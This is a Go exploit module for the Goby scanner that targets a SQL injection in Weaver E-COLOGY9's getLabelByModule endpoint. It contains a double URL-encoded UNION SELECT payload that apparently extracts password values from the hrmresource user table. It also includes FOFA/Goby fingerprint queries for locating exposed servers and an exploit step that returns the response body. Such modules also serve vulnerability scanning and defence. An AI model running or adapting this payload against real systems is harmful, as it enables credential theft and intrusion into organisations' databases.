package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver E-COLOGY9 Getlabelbymodule SQL Injecting vulnerability",
    "Description": "<p>The WEAVER Coordinated Management Application Platform (E-COLOGY) is a set of collaboration with corporate information portal, knowledge management, data center, workflow management, human resource management, customer and partner management, project management, financial management, asset management functions business platform.</p><p>Weaver E-COLOGY9 has SQL injection vulnerabilities. In addition to the attackers, they can use SQL to inject vulnerabilities to get information in the database (for example, the user's personal information of the background of the administrator and the user of the site) Enter the Trojan horses and obtain the server system permissions.</p>",
    "Product": "Weaver-OA",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-07-01",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": " body=\"/help/sys/help.html\" || header=\"Set-Cookie: ecology_JSessionid\" || banner=\"Set-Cookie: ecology_JSessionid\"",
    "GobyQuery": " body=\"/help/sys/help.html\" || header=\"Set-Cookie: ecology_JSessionid\" || banner=\"Set-Cookie: ecology_JSessionid\"",
    "Level": "2",
    "Impact": "<p>Weaver E-COLOGY9 has SQL injection vulnerabilities. In addition to the attackers, they can use SQL to inject vulnerabilities to get information in the database (for example, the user's personal information of the background of the administrator and the user of the site) Enter the Trojan horses and obtain the server system permissions.</p>",
    "Recommendation": "<p>The official has not been repaired yet, please contact the manufacturer to repair the vulnerability: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>1. The deployment of the web should prevent the wall and monitor the database operation.</p><p>2. If it is not necessary, it is forbidden to visit the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "SQL",
            "type": "input",
            "value": "%25%36%35%25%37%32%25%36%64%25%32%37%25%32%39%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%61%25%32%30%25%36%36%25%37%32%25%36%66%25%36%64%25%32%30%25%32%38%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%30%25%32%37%25%33%32%25%33%33%25%33%33%25%32%37%25%32%30%25%32%30%25%36%36%25%37%32%25%36%66%25%36%64%25%32%30%25%36%38%25%37%32%25%36%64%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%32%39%25%32%30%25%36%34%25%32%30%25%36%61%25%36%66%25%36%39%25%36%65%25%32%30%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%30%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%32%30%25%32%30%25%36%36%25%37%32%25%36%66%25%36%64%25%32%30%25%36%38%25%37%32%25%36%64%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%32%39%25%32%30%25%37%30%25%32%30%25%32%39%25%32%30%25%37%37%25%36%38%25%36%35%25%37%32%25%36%35%25%32%30%25%32%38%25%32%37%25%33%31%25%32%37%25%32%30%25%33%64%25%32%37%25%33%31",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/ec/dev/locale/getLabelByModule?moduleCode=%25%36%35%25%37%32%25%36%64%25%32%37%25%32%39%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%61%25%32%30%25%36%36%25%37%32%25%36%66%25%36%64%25%32%30%25%32%38%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%30%25%32%37%25%33%32%25%33%33%25%33%33%25%32%37%25%32%30%25%32%30%25%36%36%25%37%32%25%36%66%25%36%64%25%32%30%25%36%38%25%37%32%25%36%64%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%32%39%25%32%30%25%36%34%25%32%30%25%36%61%25%36%66%25%36%39%25%36%65%25%32%30%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%30%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%32%30%25%32%30%25%36%36%25%37%32%25%36%66%25%36%64%25%32%30%25%36%38%25%37%32%25%36%64%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%32%39%25%32%30%25%37%30%25%32%30%25%32%39%25%32%30%25%37%37%25%36%38%25%36%35%25%37%32%25%36%35%25%32%30%25%32%38%25%32%37%25%33%31%25%32%37%25%32%30%25%33%64%25%32%37%25%33%31",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "datas",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "language",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "status",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "defaultSelectAllMaxSize",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/ec/dev/locale/getLabelByModule?moduleCode={{{SQL}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Cology9 getLabelByModule SQL注入漏洞",
            "Product": "泛微-协同办公OA",
            "Description": "<p>泛微协同管理应用平台（e-cology）是一套兼具企业信息门户、知识管理、数据中心、工作流管理、人力资源管理、客户与合作伙伴管理、项目管理、财务管理、资产管理功能的协同商务平台。<br></p><p>泛微 E-Cology9 存在SQL注入漏洞，攻击者除了可以利用 SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进⼀步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>1、部署Web应⽤防⽕墙，对数据库操作进⾏监控。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>泛微 E-Cology9 存在SQL注入漏洞，攻击者除了可以利用 SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Weaver E-COLOGY9 Getlabelbymodule SQL Injecting vulnerability",
            "Product": "Weaver-OA",
            "Description": "<p>The WEAVER Coordinated Management Application Platform (E-COLOGY) is a set of collaboration with corporate information portal, knowledge management, data center, workflow management, human resource management, customer and partner management, project management, financial management, asset management functions business platform.</p><p>Weaver E-COLOGY9 has SQL injection vulnerabilities. In addition to the attackers, they can use SQL to inject vulnerabilities to get information in the database (for example, the user's personal information of the background of the administrator and the user of the site) Enter the Trojan horses and obtain the server system permissions.</p>",
            "Recommendation": "<p>The official has not been repaired yet, please contact the manufacturer to repair the vulnerability: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>1. The deployment of the web should prevent the wall and monitor the database operation.</p><p>2. If it is not necessary, it is forbidden to visit the system.</p>",
            "Impact": "<p>Weaver E-COLOGY9 has SQL injection vulnerabilities. In addition to the attackers, they can use SQL to inject vulnerabilities to get information in the database (for example, the user's personal information of the background of the administrator and the user of the site) Enter the Trojan horses and obtain the server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}